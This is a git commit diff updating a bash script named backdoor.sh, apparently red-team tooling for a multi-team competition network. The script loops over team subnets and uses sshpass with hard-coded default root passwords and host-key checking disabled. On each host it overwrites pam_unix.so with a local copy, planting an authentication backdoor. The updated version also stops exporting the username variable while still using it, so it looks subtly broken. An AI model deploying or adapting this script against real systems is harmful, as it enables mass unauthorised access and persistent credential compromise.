5a42ad6d275ea3fd48d2e7da2fdfdb895acb91f9
sawyer3399 <46585978+sawyer3399@users.noreply.github.com>
2025-03-19 18:29:50 -0500

    Update backdoor.sh

--- backdoor.sh
+++ backdoor.sh
@@ -1,16 +1,18 @@
 #!/bin/bash
 
 IPs=()
+network_id="1.1"
+number_of_teams=10
+host_ids=(1 2 3)
+
 username="root"
-default_password="Password1!"
-timeout_duration=5
+password="password"
+
+timeout=5
 path_to_pam="/lib/x86_64-linux-gnu/security"
 local_pam_file="/tmp/pam_unix.so"
 
 create_IPs() {
-    network_id="1.1"
-    number_of_teams=3
-    host_ids=(1 2 3)
     for ((team=1; team<=number_of_teams; team++)); do
         for host_id in "${host_ids[@]}"; do
             IPs+=("$network_id.$team.$host_id")
@@ -20,11 +22,11 @@ create_IPs() {
 
 main() {
     create_IPs
-    export default_password timeout_duration username path_to_pam local_pam_file
+    export password timeout path_to_pam local_pam_file
 
     printf "%s\n" "${IPs[@]}" | xargs -P 20 -n1 -I {} bash -c '
         IP="{}"
-        sshpass -p "$default_password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$local_pam_file" "$username@$IP:$path_to_pam/pam_unix.so" || true
+        sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$local_pam_file" "$username@$IP:$path_to_pam/pam_unix.so" || true
     '
 }
 
